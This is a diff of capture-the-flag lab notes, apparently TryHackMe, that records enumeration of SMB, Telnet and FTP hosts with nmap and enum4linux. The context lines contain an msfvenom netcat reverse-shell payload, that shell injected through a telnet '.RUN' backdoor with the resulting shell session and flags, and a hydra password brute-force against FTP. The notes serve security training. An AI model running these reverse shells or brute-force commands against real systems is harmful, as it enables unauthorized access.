@@ -1,6 +1,5 @@
 ### IP
 
-
 10.10.227.53 IP address
 
 ### Enumerating smb
@@ -372,8 +371,6 @@ No printers returned.
 enum4linux complete on Tue Oct 13 19:34:33 2020
 ```
 
-
-
 ### nmap scan
 
 ```
@@ -417,11 +414,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Tue Oct 13 19:29:24 2020 -- 1 IP address (1 host up) scanned in 29.12 seconds
 ```
 
-
 ### IP
 
-
-IP address 
+IP address
 
 10.10.10.2
 
@@ -438,7 +433,6 @@ ssh -i id_rsa cactus@10.10.27.168
 cat the smb.tx flag
 THM{smb_is_fun_eh?}
 
-
 ### Telnet
 
 telnet 10.10.10.3 23
@@ -452,6 +446,7 @@ nmap -p- -oA nmap/allports 10.10.134.91
 had to run this with ping disabled
 
 nmap -p- -Pn -oA nmap/allports 10.10.134.91
+
 ```
 # Nmap 7.91 scan initiated Fri Oct 23 19:37:39 2020 as: nmap -p- -Pn -oA nmap/allports 10.10.134.91
 Nmap scan report for 10.10.134.91
@@ -466,6 +461,7 @@ PORT     STATE SERVICE
 now without allports
 
 nmap -Pn -oA nmap/second_scan 10.10.134.91
+
 ```
 # Nmap 7.91 scan initiated Fri Oct 23 19:50:26 2020 as: nmap -Pn -oA nmap/second_scan 10.10.134.91
 Nmap scan report for 10.10.134.91
@@ -480,6 +476,7 @@ using non standard ports it could be used for a backdoor
 nmap scan for open ports
 
 nmap -A -p 8012 10.10.134.91
+
 ```
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-23 20:03 EDT
 Nmap scan report for 10.10.134.91
@@ -557,6 +554,7 @@ Run this on machine
 msfvenom -p cmd/unix/reverse_netcat lhost=10.6.11.238 lport=4444 R 
 
 ```
+
 WARN: Unresolved or ambiguous specs during Gem::Specification.reset:
       reline (>= 0)
       Available/installed versions of this gem:
@@ -569,6 +567,7 @@ Please report a bug if this causes problems.
 No encoder specified, outputting raw payload
 Payload size: 89 bytes
 mkfifo /tmp/celb; nc 10.6.11.238 4444 0</tmp/celb | /bin/sh >/tmp/celb 2>&1; rm /tmp/celb
+
 ```
 
 nc -lvp 4444
@@ -577,19 +576,22 @@ telnet into IP machine
 .RUN mkfifo /tmp/dblm; nc 10.6.11.238 4444 0</tmp/dblm | /bin/sh >/tmp/dblm 2>&1; rm /tmp/dblm
 
 ```
+
 Listening on 0.0.0.0 4444
 Connection received on 10.10.175.109 38028
 ls
 flag.txt
 cat flag.txt
 THM{y0u_g0t_th3_t3ln3t_fl4g}
+
 ```
 
 ### Enumerating FTP
 
 ```
+
 nmap -sC -sV -oA nmap/initial 10.10.234.147
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:55 EST
+Starting Nmap 7.91 ( <https://nmap.org> ) at 2020-11-26 17:55 EST
 Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 97.11% done; ETC: 17:55 (0:00:00 remaining)
 Nmap scan report for 10.10.234.147
@@ -599,8 +601,8 @@ PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:10.6.11.238
 |      Logged in as ftp
@@ -617,7 +619,8 @@ PORT   STATE SERVICE VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 Service Info: Host: Welcome
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
+
 ```
 hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.234.147 ftp
